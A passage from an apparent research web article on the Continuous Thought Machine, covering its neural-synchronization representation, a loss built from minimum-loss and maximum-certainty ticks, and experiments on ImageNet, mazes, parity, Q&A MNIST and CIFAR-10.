<p>Since this matrix scales in <span><span><math><semantics><mrow><mi>O</mi><mo>(</mo><msup><mi>D</mi><mn>2</mn></msup><mo>)</mo></mrow><annotation encoding="application/x-tex">O(D^2)</annotation></semantics></math></span></span> it makes practical sense to subsample <span><span><math><semantics><mrow><mo>(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">(i,j)</annotation></semantics></math></span></span> row-column pairs, which capture the synchronization between neurons <span><span><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span></span>. To do so we randomly select <span><span><math><semantics><mrow><msub><mi>D</mi><mtext><mi mathvariant="normal">o</mi><mi mathvariant="normal">u</mi><mi mathvariant="normal">t</mi></mtext></msub></mrow><annotation encoding="application/x-tex">D_\text{out}</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><msub><mi>D</mi><mtext><mi mathvariant="normal">a</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">i</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">n</mi></mtext></msub></mrow><annotation encoding="application/x-tex">D_\text{action}</annotation></semantics></math></span></span> <span><span><math><semantics><mrow><mo>(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">(i,j)</annotation></semantics></math></span></span> pairs from <span><span><math><semantics><mrow><mrow><mi mathvariant="bold">S</mi></mrow></mrow><annotation encoding="application/x-tex">\bold{S}</annotation></semantics></math></span></span>, thus collecting two <strong>synchronization representations</strong>, <span><span><math><semantics><mrow><msubsup><mrow><mi mathvariant="bold">S</mi></mrow><mtext><mi mathvariant="normal">o</mi><mi mathvariant="normal">u</mi><mi mathvariant="normal">t</mi></mtext><mi>t</mi></msubsup><mo>∈</mo><mtext>&nbsp;</mtext><msup><mrow><mi mathvariant="double-struck">R</mi></mrow><mrow><msub><mi>D</mi><mtext><mi mathvariant="normal">o</mi><mi mathvariant="normal">u</mi><mi mathvariant="normal">t</mi></mtext></msub></mrow></msup></mrow><annotation encoding="application/x-tex">\bold{S}^t_\text{out} \in~\mathbb{R}^{D_\text{out}}</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><msubsup><mrow><mi mathvariant="bold">S</mi></mrow><mtext><mi mathvariant="normal">a</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">i</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">n</mi></mtext><mi>t</mi></msubsup><mo>∈</mo><mtext>&nbsp;</mtext><msup><mrow><mi mathvariant="double-struck">R</mi></mrow><mrow><msub><mi>D</mi><mtext><mi mathvariant="normal">a</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">i</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">n</mi></mtext></msub></mrow></msup></mrow><annotation encoding="application/x-tex">\bold{S}^t_\text{action} \in~\mathbb{R}^{D_\text{action}}</annotation></semantics></math></span></span>. <span><span><math><semantics><mrow><msubsup><mrow><mi mathvariant="bold">S</mi></mrow><mtext><mi mathvariant="normal">o</mi><mi mathvariant="normal">u</mi><mi mathvariant="normal">t</mi></mtext><mi>t</mi></msubsup></mrow><annotation encoding="application/x-tex">\bold{S}^t_\text{out}</annotation></semantics></math></span></span> can then be projected to an output space as:</p>
<p><span><span><span><math><semantics><mrow><msup><mrow><mi mathvariant="bold">y</mi></mrow><mi>t</mi></msup><mo>=</mo><msub><mrow><mi mathvariant="bold">W</mi></mrow><mrow><mtext><mi mathvariant="normal">o</mi><mi mathvariant="normal">u</mi><mi mathvariant="normal">t</mi></mtext></mrow></msub><mo>⋅</mo><msubsup><mrow><mi mathvariant="bold">S</mi></mrow><mtext><mi mathvariant="normal">o</mi><mi mathvariant="normal">u</mi><mi mathvariant="normal">t</mi></mtext><mi>t</mi></msubsup><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">\bold{y}^t = \bold{W}_{\text{out}} \cdot \bold{S}^t_\text{out}.
</annotation></semantics></math></span></span></span></p>

<div>
  <h4>Synchronization enables a very large representation.</h4>
  <p>
      As the model width, D, grows, the synchronization representation grows with
      \(\frac{D \times (D+1)}{2}\), offering opportunities for improved expressiveness without the need for more parameters in order to project a latent space to this size.
    </p>
</div>

<h4 id="from-data">Modulating input data</h4>
<p><span><span><math><semantics><mrow><msubsup><mrow><mi mathvariant="bold">S</mi></mrow><mtext><mi mathvariant="normal">a</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">i</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">n</mi></mtext><mi>t</mi></msubsup></mrow><annotation encoding="application/x-tex">\bold{S}^t_\text{action}</annotation></semantics></math></span></span> can be used to take actions in the world (e.g., via attention as is in our setup):</p>
<p><span><span><span><math><semantics><mrow><msup><mrow><mi mathvariant="bold">q</mi></mrow><mi>t</mi></msup><mo>=</mo><msub><mrow><mi mathvariant="bold">W</mi></mrow><mrow><mtext><mi mathvariant="normal">i</mi><mi mathvariant="normal">n</mi></mtext></mrow></msub><mo>⋅</mo><msubsup><mrow><mi mathvariant="bold">S</mi></mrow><mtext><mi mathvariant="normal">a</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">i</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">n</mi></mtext><mi>t</mi></msubsup></mrow><annotation encoding="application/x-tex">\bold{q}^t = \bold{W}_{\text{in}} \cdot \bold{S}^t_\text{action}
</annotation></semantics></math></span></span></span></p>
<p>where <span><span><math><semantics><mrow><msub><mrow><mi mathvariant="bold">W</mi></mrow><mrow><mtext><mi mathvariant="normal">o</mi><mi mathvariant="normal">u</mi><mi mathvariant="normal">t</mi></mtext></mrow></msub></mrow><annotation encoding="application/x-tex">\bold{W}_{\text{out}}</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><msub><mrow><mi mathvariant="bold">W</mi></mrow><mrow><mtext><mi mathvariant="normal">i</mi><mi mathvariant="normal">n</mi></mtext></mrow></msub></mrow><annotation encoding="application/x-tex">\bold{W}_{\text{in}}</annotation></semantics></math></span></span> are learned weight matrices that project synchronization into vectors for observation (e.g., attention queries, <span><span><math><semantics><mrow><msup><mrow><mi mathvariant="bold">q</mi></mrow><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">\bold{q}^t</annotation></semantics></math></span></span>) or outputs (e.g., logits, <span><span><math><semantics><mrow><msup><mrow><mi mathvariant="bold">y</mi></mrow><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">\bold{y}^t</annotation></semantics></math></span></span>). Even though there are <span><span><math><semantics><mrow><mo>(</mo><mi>D</mi><mo>×</mo><mo>(</mo><mi>D</mi><mo>+</mo><mn>1</mn><mo>)</mo><mo>)</mo><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">(D \times (D+1))/2</annotation></semantics></math></span></span> unique pairings in <span><span><math><semantics><mrow><msup><mrow><mi mathvariant="bold">S</mi></mrow><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">\bold{S}^t</annotation></semantics></math></span></span>, <span><span><math><semantics><mrow><msub><mi>D</mi><mtext><mi mathvariant="normal">o</mi><mi mathvariant="normal">u</mi><mi mathvariant="normal">t</mi></mtext></msub></mrow><annotation encoding="application/x-tex">D_\text{out}</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><msub><mi>D</mi><mtext><mi mathvariant="normal">a</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">i</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">n</mi></mtext></msub></mrow><annotation encoding="application/x-tex">D_\text{action}</annotation></semantics></math></span></span> can be orders of magnitude smaller than this. That said, the full synchronization matrix is a large representation that has high future potential.</p>
<p>In most of our experiments we used standard cross attention <dt-cite key="vaswani2017attention"></dt-cite>:</p>
<p><span><span><span><math><semantics><mrow><msup><mrow><mi mathvariant="bold">o</mi></mrow><mi>t</mi></msup><mo>=</mo><mtext><mi mathvariant="normal">A</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">e</mi><mi mathvariant="normal">n</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">i</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">n</mi></mtext><mo>(</mo><mi>Q</mi><mo>=</mo><msup><mrow><mi mathvariant="bold">q</mi></mrow><mi>t</mi></msup><mo separator="true">,</mo><mi>K</mi><mi>V</mi><mo>=</mo><mtext><mi mathvariant="normal">F</mi><mi mathvariant="normal">e</mi><mi mathvariant="normal">a</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">u</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">e</mi><mi mathvariant="normal">E</mi><mi mathvariant="normal">x</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">a</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">r</mi></mtext><mo>(</mo><mtext><mi mathvariant="normal">d</mi><mi mathvariant="normal">a</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">a</mi></mtext><mo>)</mo><mo>)</mo></mrow><annotation encoding="application/x-tex">\bold{o}^t = \text{Attention}(Q=\bold{q}^t, KV=\text{FeatureExtractor}(\text{data}))
</annotation></semantics></math></span></span></span></p>
<p>where a 'FeatureExtractor' model, e.g., a ResNet <dt-cite key="he2016deep"></dt-cite>, is first used to build useful local features for the keys and values. <span><span><math><semantics><mrow><msup><mrow><mi mathvariant="bold">o</mi></mrow><mrow><mi>t</mi></mrow></msup></mrow><annotation encoding="application/x-tex">\bold{o}^{t}</annotation></semantics></math></span></span> is concatenated with <span><span><math><semantics><mrow><msup><mrow><mi mathvariant="bold">z</mi></mrow><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">\bold{z}^{t+1}</annotation></semantics></math></span></span> for the next cycle of recurrence.</p>
<h3 id="loss-function">Loss function: optimizing across internal ticks</h3>
<p>The CTM produces outputs at each internal tick, <span><span><math><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span></span>. A key question arises: how do we optimize the model across this internal temporal dimension?  Let <span><span><math><semantics><mrow><msup><mrow><mi mathvariant="bold">y</mi></mrow><mi>t</mi></msup><mo>∈</mo><msup><mrow><mi mathvariant="double-struck">R</mi></mrow><mrow><mi>C</mi></mrow></msup></mrow><annotation encoding="application/x-tex">\bold{y}^t \in \mathbb{R}^{C}</annotation></semantics></math></span></span> be the prediction vector (e.g., probabilities of classes) at internal tick <span><span><math><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span></span>, where <span><span><math><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span></span> is the number of classes.  Let <span><span><math><semantics><mrow><msub><mi>y</mi><mrow><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi></mrow></msub></mrow><annotation encoding="application/x-tex">y_{true}</annotation></semantics></math></span></span> be the ground truth target. We can compute a loss at each internal tick using a standard loss function, such as cross-entropy:</p>
<p><span><span><span><math><semantics><mrow><msup><mrow><mi mathvariant="script">L</mi></mrow><mi>t</mi></msup><mo>=</mo><mtext><mi mathvariant="normal">C</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">s</mi><mi mathvariant="normal">s</mi><mi mathvariant="normal">E</mi><mi mathvariant="normal">n</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">p</mi><mi mathvariant="normal">y</mi></mtext><mo>(</mo><msup><mrow><mi mathvariant="bold">y</mi></mrow><mi>t</mi></msup><mo separator="true">,</mo><msub><mi>y</mi><mrow><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi></mrow></msub><mo>)</mo><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">    \mathcal{L}^t = \text{CrossEntropy}(\bold{y}^t, y_{true}),
</annotation></semantics></math></span></span></span></p>
<p>and a corresponding certainty measure, <span><span><math><semantics><mrow><msup><mrow><mi mathvariant="script">C</mi></mrow><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">\mathcal{C}^t</annotation></semantics></math></span></span>. We compute certainty simply as 1 - normalised entropy. We compute <span><span><math><semantics><mrow><msup><mrow><mi mathvariant="script">L</mi></mrow><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">\mathcal{L}^t</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><msup><mrow><mi mathvariant="script">C</mi></mrow><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">\mathcal{C}^t</annotation></semantics></math></span></span> for all <span><span><math><semantics><mrow><mi>t</mi><mo>∈</mo><mo>{</mo><mn>1</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>T</mi><mo>}</mo></mrow><annotation encoding="application/x-tex">t \in \{1, \ldots, T\}</annotation></semantics></math></span></span>, yielding losses and certainties per internal tick, <span><span><math><semantics><mrow><mrow><mi mathvariant="script">L</mi></mrow><mo>∈</mo><msup><mrow><mi mathvariant="double-struck">R</mi></mrow><mrow><mi>T</mi></mrow></msup></mrow><annotation encoding="application/x-tex">\mathcal{L} \in \mathbb{R}^{T}</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><mrow><mi mathvariant="script">C</mi></mrow><mo>∈</mo><msup><mrow><mi mathvariant="double-struck">R</mi></mrow><mrow><mi>T</mi></mrow></msup></mrow><annotation encoding="application/x-tex">\mathcal{C} \in \mathbb{R}^{T}</annotation></semantics></math></span></span>.</p>
<p>A natural question arises: how should we reduce <span><span><math><semantics><mrow><mrow><mi mathvariant="script">L</mi></mrow></mrow><annotation encoding="application/x-tex">\mathcal{L}</annotation></semantics></math></span></span> into a scalar loss for learning? Our loss function is designed to optimize CTM performance across the internal thought dimension. Instead of relying on a single step (e.g., the last step), which can incentivize the model to only output at that specific step, we dynamically aggregate information from two internal ticks: the point of minimum loss and the point of maximum certainty:</p>
<ul>
<li>the point of minimum loss: <span><span><math><semantics><mrow><msub><mi>t</mi><mn>1</mn></msub><mo>=</mo><mtext><mi mathvariant="normal">a</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">g</mi><mi mathvariant="normal">m</mi><mi mathvariant="normal">i</mi><mi mathvariant="normal">n</mi></mtext><mo>(</mo><mrow><mi mathvariant="script">L</mi></mrow><mo>)</mo></mrow><annotation encoding="application/x-tex">t_1=\text{argmin}(\mathcal{L})</annotation></semantics></math></span></span>; and</li>
<li>the point of maximum certainty: <span><span><math><semantics><mrow><msub><mi>t</mi><mn>2</mn></msub><mo>=</mo><mtext><mi mathvariant="normal">a</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">g</mi><mi mathvariant="normal">m</mi><mi mathvariant="normal">a</mi><mi mathvariant="normal">x</mi></mtext><mo>(</mo><mrow><mrow><mi mathvariant="script">C</mi></mrow></mrow><mo>)</mo></mrow><annotation encoding="application/x-tex">t_2=\text{argmax}({\mathcal{C}})</annotation></semantics></math></span></span>.</li>
</ul>
<p>This approach is advantageous because it means that the CTM can perform meaningful computations across multiple internal ticks, naturally facilitates a curriculum effect, and enables the CTM to tailor computation based on problem difficulty. The final loss is computed as:</p>
<p><span><span><span><math><semantics><mrow><mi>L</mi><mo>=</mo><mfrac><mrow><msup><mrow><mi mathvariant="script">L</mi></mrow><mrow><msub><mi>t</mi><mn>1</mn></msub></mrow></msup><mo>+</mo><msup><mrow><mi mathvariant="script">L</mi></mrow><mrow><msub><mi>t</mi><mn>2</mn></msub></mrow></msup></mrow><mrow><mn>2</mn></mrow></mfrac><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">    L = \frac{\mathcal{L}^{t_1} + \mathcal{L}^{t_2}}{2}.
</annotation></semantics></math></span></span></span></p>
<div>
  <h4>More information in our Technical Report.</h4>
  <div>
    <p>Please take a look at our <a href="https://arxiv.org/abs/2505.05522" target="_blank">Technical Report</a> for more information.</p>
    <p>Specifically, it includes additional information on how we enable the CTM to learn short versus long time dependency.</p>
  </div>
</div>
<hr>
<h2>Experiment: ImageNet</h2>
<div id="imagenet-experiment"> 
        <div id="imagenet-demos">
            <h3>Demonstrations</h3>
            
            
            <figcaption>
                <span><b>Fig 4.</b> Thinking about Images</span>: Top left is the average attention weighting (of the 16 heads shown) when the CTM observes the image on the right. Class predictions are shown on the bottom left and the certainty is shown on the bottom right (<span>green</span> denotes a correct prediction). The small images at the bottom are buttons to load other examples, showing a diversity of certainties and correctness.
            </figcaption>
        </div>
        <div>
            <h3>Results</h3>
            
            <div>
                <p>This is a subset of results from our ImageNet experiments (see the <a href="https://arxiv.org/abs/2505.05522" target="_blank">Technical Report</a> for more). Crucially, the CTM enables <b>Adaptive Compute</b> where the internal steps, (<i>how much thought the CTM is putting into the problem</i>) can be cut short. These figures show what can be expected in terms of accuracy when cutting thinking short. Only marginal gains are had past a certain point, but gains nonetheless.</p>
                <p> Fig 4. shows where the CTM looks as it reasons about the data. We show the <b>Attention Weights</b> for all 16 heads and demark where the model is looking for each (and on average at the top). The predictions are shown on the bottom left and certainty over time on the bottom right. Fig 6. shows a visualization of <b>Neural Activity</b> as the CTM thinks about a single image: note the multi-scale structure and how activity seems to 'flow'.
            </p></div>
            
            <figcaption>
                <span><b>Fig 6.</b> Neural activity</span>: visualised in 2D using a <a href="https://umap-learn.readthedocs.io/en/latest/" target="_blank">UMAP</a> projection. Each neuron is shown as an individual dot, scaling in size with absolute magnitude, and color with value (<span>blue</span> for negative, <span>red</span> for positive). We show similar visualizations inside later demonstrations.
            </figcaption>
        </div>
        <div>
            <h3>Discussion</h3>
            <p>We never set out to train a model that achieved some remarkable new state-of-the-art performance on ImageNet. AI researchers already expect high performance on ImageNet after over a decade of research that uses it. Instead, we wanted to show just how different and interesting <b>the CTM's interaction with data</b> can be. The videos on the left/above demonstrate the thought process the CTM undertakes and the figures show its benefits.
            </p><p>Let's contextualize just what's going on here: the CTM is looking around these images, all the while building up its prediction, all by using the <b>synchronization of neural activity</b> directly as a representation. The <a href="#neural-dynamics">neural dynamics</a> we showed earlier are actually examples of dynamics from a CTM observing ImageNet! The paths output by the CTM in <a href="#maze-demo">the maze demo</a> are akin to the class predictions made here.
            </p><h4>The missing ingredient: TIME</h4>
            <p><b>Biological intelligence is still superior to AI in many cases</b> <dt-cite key="chollet2024arc,phan2025humanitysexamshort,lake2017building,ren2024brain"></dt-cite>. Biological brains solve tasks very differently to conventional neural networks, which might explain why this is the case. It might be that <a href="https://www.thetransmitter.org/neuroai/the-brain-holds-no-exclusive-rights-on-how-to-create-intelligence/" target="_blank">biological intelligence pays heed to time</a> in ways that modern AI simply does not. In this work, we aimed to develop a model that approaches problem-solving in a manner more aligned with biological brains, emphasizing the central role of the precise timing and interplay of neural dynamics. The interpretable and intuitive outcome we point at in the video demonstrations is very exciting as it suggests that the CTM is indeed leveraging time to its advantage, in order to reason about data.</p>
            <p>The details on model hyper-parameters can be found in the <a href="https://arxiv.org/abs/2505.05522" target="_blank">Technical Report</a>.</p>
        </div>
    </div>

<h2>Experiment: Solving 2D Mazes - doing it the hard way</h2>
<div id="maze-experiment"> 
        <div>
            <h3>The why and the how</h3>
            <p>
            Solving mazes is a challenging task for machines <dt-cite key="zhang2025t,schwarzschild2021can,bansal2022end"></dt-cite>, where only the current <a href="https://openai.com/index/thinking-with-images/" target="_blank">bleeding edge models perform well</a> on fairly simple <a href="https://featurecrew.io/tests/maze" target="_blank">mazes</a>. Even so, existing methods either require careful design of the data/objective (e.g., outputs are images instead of a <i>solution</i>), or extensive tool use (e.g., LLMs that perform well at this), indicating that the underlying <b>intelligent reasoning</b> required to solve a maze, step-by-step, is not evidenced by these approaches.
            </p>
            <p>
            We trained n CTM on a new setup, requiring it to directly predict a path (truncated for simplicity) from start to finish in the form of steps: <b>L</b>eft, <b>R</b>ight, <b>U</b>p, <b>D</b>own, or <b>W</b>ait. A small version of the resultant model can be explored in the <a href="#maze-demo">interactive demo at the top of this page</a>. We show a demonstration of larger model here. Remarkably, the attention pattern is intuitive and follows the solution, all while using neural synchronization as a representation. It even generalizes beyond the truncated path! See the <a href="https://arxiv.org/abs/2505.05522" target="_blank">Technical Report</a>.
            </p>
            <h3>Demonstration</h3>
            
            <figcaption>
                <span><b>Fig 7.</b> Thinking about mazes</span>: each animation segment shows 75 internal ticks of the CTM when it is provided with the input maze. We show the route as it is constructed through the internal 'thought process', showing only the valid route (i.e., ignoring predictions through walls; see the associated toggle on the <a href="#maze-demo">demo</a>). 16 attention heads' weights are shown at the bottom and the average is overlayed on the maze to show where the CTM is focusing. We 'teleport' the CTM to its resultant predicted location until it lands on the target and then load a new maze.
            </figcaption>
        </div>
        <div>
            <h3 id="maze-results">Results</h3>
            
            <h3>Generalization</h3>
            <p>Each video below shows how well the CTM generalizes to bigger and more complex mazes, while retaining its reasoning prowess. To generate these we used a CTM trained to solve a path up to length 100 on 39 x 39 mazes, but the mazes shown here are of size 99 x 99 and the full paths are roughly 6x as long.</p>
            
        </div>
        <div>
            <h3>Discussion</h3>
            <p>Why run these experiments? We know that neural networks can be tailored to solve 2D mazes if we present the data in the "right" way. But, when presented in a fashion that requires a clear process through which the model must progress, existing methods fall short. Even current SoTA LLMs rely on tool use, which is impressive in its own right, but somewhat unsatisfying: an intelligent machine should be demonstrably intelligent, and humans don't require tools to solve these mazes. </p>
            <p>We set out to show that the CTM has the capacity to learn when complex reasoning is required, unlike the most comparable baseline methods. We also show how the CTM generalizes to larger and more complex mazes, indicating that its internal reasoning is not merely memorization, but rather a more natural and correct way to solve the underlying maze problem. Importantly, we made no specific structural changes to the model compared to the <a href="#imagenet-experiment">CTM we trained for ImageNet</a>; the only meaningful structural change was to output the solution as a 2D class space, applying cross entropy for each step.
            </p><h4>A World Model</h4>
            <p>We chose our setup carefully: (1) we used <b>no positional embedding</b> for attention; and (2) we required that the models predict the routes directly as a string of classes (e.g., go left, left, right, up, etc.). By forgoing positional embedding the CTM must build an <b>internal world model</b> in order to query the data and navigate the maze. The fact that it does so in such a convincing fashion is remarkable. </p>
            <h4>Where to go from here?</h4>
            <p>We have some strong evidence that the CTM is capable of solving challenging problems, and it does so in intuitive and interesting ways. The fact that it can solve mazes by building an internal world model "on the fly" without any positional embedding opens up avenues for future research. For instance, we would like to see how the CTM finds its way around more complex environments (e.g., games or videos) without any explicit positional encodings.</p>
        </div>
    </div>
<h2>Experiment: Parity</h2>
<div id="parity-experiment"> 
        <div>
            <h3>Sequential data, non-sequentially</h3>
            <p>
            The parity of a binary sequence, given by the sign of the product of its elements, can reasonably be predicted by an RNN when the data is fed sequentially - the model need only maintain an internal state, flipping a 'switch' whenever a negative number if encountered. When the entire sequence is provided at once, however, the task is significantly more challenging<dt-cite key="graves2016adaptive"></dt-cite>.
            </p>
            <p>
            We trained CTMs to solve a variant of this parity task: the model is input with a 64-length binary vector, and must predict the <i>cumulative</i> parity at each of the 64 positions.
            </p>
            <h3>Demonstration</h3>
            
            <figcaption>
                <span><b>Fig 9.</b> Determining the cumulative parity of a sequence</span>: shown are the movements of the attention weights from each of the 8 heads. Overlayed on the input sequences is the trajectory of the attention weight argmax. The larger sequences depict the models predictions and targets.
            </figcaption>
        </div>
        <div>
            <h3>Results</h3>
            
                <p>
                We compare the accuracy of CTMs trained with different numbers of internal ticks to parameter matched LSTMs. We found that CTMs with over 75 internal ticks could reliably solve this task, with some runs achieving 100% accuracy. The LSTMs, on the other hand, struggled to learn with over 10 internal ticks, suggesting that LSTMs are not well suited to unfolding an internal thought dimension.
                </p>
                <p>
                The left/above demonstration shows the solving process of the CTM: the movement of the attention weights, as well as their argmax overlayed on the inputs, the models predictions, the target and the neuron activations. Notice how the attention moves <b>backwards</b> through the data and determines the solution after observing the entire input. Some attention heads display interpretable behavior, such as the first attention head which attends to only negative parity positions (\(\blacksquare\)).
                </p>
            </div>
        <div>
   <h3>Learning sequential algorithms</h3>
            <p>We visualise the learned algorithms by plotting the accuracy (top) and attention weights (bottom) over the 75 internal ticks for each position in the 64-length sequence, at different points during training. One model (left) attends to the data in reverse order before predicting the cumulative parity at once; the other attends forward, predicting parity incrementally. Both achieve perfect accuracy.
            </p>
            <p>
            The ability of the CTM to search through the data in reverse order, suggests that the CTM is carrying out some form of planning, building up its understanding of the data before making a final decision -- the CTM is capable of forming and following a strategy.
            </p>
            <p>
                <figure>
                    <video src="https://pub.sakana.ai/ctm/assets/mp4/parity/run1.mp4" type="video/mp4" autoplay="" muted="" playsinline="" loop=""></video>
                    <figcaption>
                        <span><b>Fig 11a.</b> 75-Internal Tick CTM 1</span>: learns to attend to the data in reverse order, predicting the parity at the end of the reasoning process.
                    </figcaption>
                </figure>
                <figure>
                    <video src="https://pub.sakana.ai/ctm/assets/mp4/parity/run3.mp4" type="video/mp4" autoplay="" muted="" playsinline="" loop=""></video>
                        <figcaption>
                        <span><b>Fig 11b.</b> 75-Internal Tick CTM 2</span>: learns to attend from beginning to end, and with it, increasing its certainty in each prediction.
                    </figcaption>
                </figure>
            </p>
        </div>
    </div>
<h2>Experiment: Q&amp;A MNIST</h2>
<div id="parity-experiment"> 
        <div>
            <h3>Memory via Synchronization</h3>
            <p>
            To assess the CTM’s ability to memorise and recall information, we design a Question and Answering (Q&amp;A) MNIST task. In this task, the model first observes a sequence of MNIST digits, followed by a series of interleaved index and operator embeddings that specify which digits should be recalled and which modular operation should be applied. Once all digits and index/operator embeddings have been presented, a zero-tensor flag signals the model to produce its final answer. An example is shown below.
            </p>
            <figure>
                <img src="https://pub.sakana.ai/ctm/assets/png/qamnist/qamnist_example.svg" alt="Accuracy during training">
                <figcaption>
                    <span><b>Fig 12.</b> Q&amp;A MNIST example</span>: a typical sequence observed by the model.
                </figcaption>
            </figure>
            <p>
            In our experiments, the memory length of the CTMs is such that the MNIST digits will always lie outside of the activation history window used by the neuron-level models. In this way, the CTM must organize its activations such that it can recall digits are later timesteps.
            </p>
            <h3>Demonstration</h3>
            
            <figcaption>
                <span><b>Fig 13.</b>Observing digits and answering questions</span>: the model is shown MNIST digits followed by operator and index embeddings which specifies the modular operation at the top. Shown also is the attention weights for the digits and the models predictions.
            </figcaption>
        </div>
        <div>
            <h3>Results</h3>
            <div>
                <figure>
                    <img src="https://pub.sakana.ai/ctm/assets/png/qamnist/accuracy_comparison.svg" alt="Accuracy during training">
                    <figcaption>
                        <span><b>Fig 14.</b> Accuracy during training</span>: for both CTMs and LSTMs trained with 1 internal tick per input and 10 internal ticks per input.
                    </figcaption>
                </figure>
                </div>
                <p>
                Our results show that, while the LSTM outperforms the CTM when only a single internal tick is used to process each input, the LSTM becomes more unstable when more internal ticks are used. The CTM, on the other hand, exhibits stronger performance with increasing internal ticks, achieving over 95% accuracy in the most challenging in-distribution task. 
                </p>
                <p>
                Furthermore, we highlight the ability of the CTM to recall digit values observed many timesteps in the past, arising purely from the organization and synchronization of neurons. This strong performance suggests that processing timing information through the synchronization of neuron activations may be a powerful mechanism for memorization and recall.
                </p>
            </div>
        <div>
            <h3>Generalization</h3>
            <p>
            We examine the generalization capabilities of the CTM by measuring the accuracy of the model when input with more digits or index-operator embeddings than observed during training, depicted below, with the training regime marked in red. We find that both the CTM and the LSTM baseline can generalize to an increased number of operations. Empirically, we find that this generalization arises from the model’s approach to solving the task: each time a new index embedding is presented, the model computes and stores the result of the specified operation, regardless of whether the answer flag has been given. This enables it to continue processing a stream of index and operator embeddings without needing to wait for a final signal.
            </p>
            
            <figcaption>
                <span><b>Fig 15.</b> Generalization:</span> accuracy of the CTM and LSTM for different numbers of input digits and operations. The red line indicates the training regime. For the CTM, performance scales with the number of internal ticks, while the converse is true for the LSTM.
            </figcaption>
        </div>
        </div> 

<hr>
<h2>Additional experiments</h2>
<h3>CTM versus humans</h3>
<p>In this section we test the CTM using CIFAR-10, comparing it to human performance, a feed-forward baseline, and an LSTM baseline. The purpose of this experiment was to contextualize the performance of the CTM alongside a standard feed-forward baseline, an LSTM baseline that also uses internal ticks for reasoning (potentially), and humans. We used a restricted backbone to highlight the differences between models (details in the <a href="https://arxiv.org/abs/2505.05522" target="_blank">Technical Report</a>).</p>
<p>We used two datasets of human labels for CIFAR-10; we call these CIFAR-10D <dt-cite key="ho2018cifar10"></dt-cite> owing to its calibration of difficulty levels, and CIFAR-10H <dt-cite key="peterson2019human"></dt-cite> originally used to quantify human uncertainty. CIFAR-10D can be found at <a href="https://sites.google.com/site/hophuoctien/projects/virec/cifar10-classification" target="_blank">here</a> and CIFAR-10H can be found <a href="https://github.com/jcpeterson/cifar-10h" target="_blank">here</a>.</p>

<p>For the human calibration we used the probabilities provided in CIFAR-10H, which were computed using guesses from multiple humans using the available human datasets. We computed calibration (Fig 16b.) as we did for ImageNet: we compute the predictive probability as the average probability for the chosen class over all internal ticks (for both CTM and LSTM). The CTM demonstrates the best calibration, even when compared to humans.</p>

<p>Fig 17. shows the neural activities for the CTM and the LSTM baseline. The CTM yields rich, diverse, and complex dynamics with multiple interesting features, including periodic behavior (there is <b>no periodic driving function</b>). The distinct difference between the CTM and LSTM neural activities is evidence that the two novel elements of the CTM (<a href="#neuron-level-models">neuron-level models</a> and <a href="#synchronization-representation">synchronization as a representation</a>) enable neural dynamics as a fundamental computational mechanic.</p>
<h3>CIFAR-100, ablation studies</h3>
